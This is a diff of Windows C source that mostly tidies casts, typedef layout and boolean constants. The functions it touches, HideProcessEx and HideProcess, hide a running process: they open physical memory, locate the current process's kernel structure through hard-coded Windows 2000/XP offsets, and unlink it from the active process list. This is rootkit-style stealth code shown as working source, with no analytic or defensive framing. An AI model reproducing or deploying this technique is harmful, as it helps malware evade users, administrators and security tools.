@@ -32,15 +32,8 @@ typedef struct _OBJECT_ATTRIBUTES{
     PVOID SecurityDescriptor;
     PVOID SecurityQualityOfService;
 } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES; 
-typedef NTSTATUS (CALLBACK* ZWOPENSECTION)(
-    OUT PHANDLE SectionHandle,
-    IN ACCESS_MASK DesiredAccess,
-    IN POBJECT_ATTRIBUTES ObjectAttributes
-);
-typedef VOID (CALLBACK* RTLINITUNICODESTRING)(
-    IN OUT PUNICODE_STRING DestinationString,
-    IN PCWSTR SourceString
-);
+typedef NTSTATUS (CALLBACK* ZWOPENSECTION)( OUT PHANDLE SectionHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes);
+typedef VOID (CALLBACK* RTLINITUNICODESTRING)(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);
 RTLINITUNICODESTRING RtlInitUnicodeString;
 ZWOPENSECTION ZwOpenSection;
 HMODULE g_hNtDLL = NULL;
@@ -180,30 +173,30 @@ BOOL HideProcessEx(){
     if (0 == OpenPhysicalMemory())
         return FALSE;
     ULONG thread  = GetData((PVOID)0xFFDFF124);
-    ULONG process = GetData(PVOID(thread + 0x44));
+    ULONG process = GetData((PVOID)(thread + 0x44));
     ULONG fw, bw;
     if (0 == g_osvi.dwMinorVersion){
-        fw = GetData(PVOID(process + 0xa0));
-        bw = GetData(PVOID(process + 0xa4));        
+        fw = GetData((PVOID)(process + 0xa0));
+        bw = GetData((PVOID)(process + 0xa4));        
     }
     if (1 == g_osvi.dwMinorVersion){
-        fw = GetData(PVOID(process + 0x88));
-        bw = GetData(PVOID(process + 0x8c));
+        fw = GetData((PVOID)(process + 0x88));
+        bw = GetData((PVOID)(process + 0x8c));
     }
-    SetData(PVOID(fw + 4), bw);
-    SetData(PVOID(bw), fw);
+    SetData((PVOID)(fw + 4), bw);
+    SetData((PVOID)(bw), fw);
     CloseHandle(g_hMPM);
     CloseNTDLL();
     return TRUE;
 }
 
 BOOL HideProcess(){
-	static BOOL b_hide = false;
+	static BOOL b_hide = FALSE;
 	if (!b_hide) {
-		b_hide = true;
+		b_hide = TRUE;
 		HideProcessEx();
-		return true;
+		return TRUE;
 	}
-	return true;
+	return TRUE;
 }
 
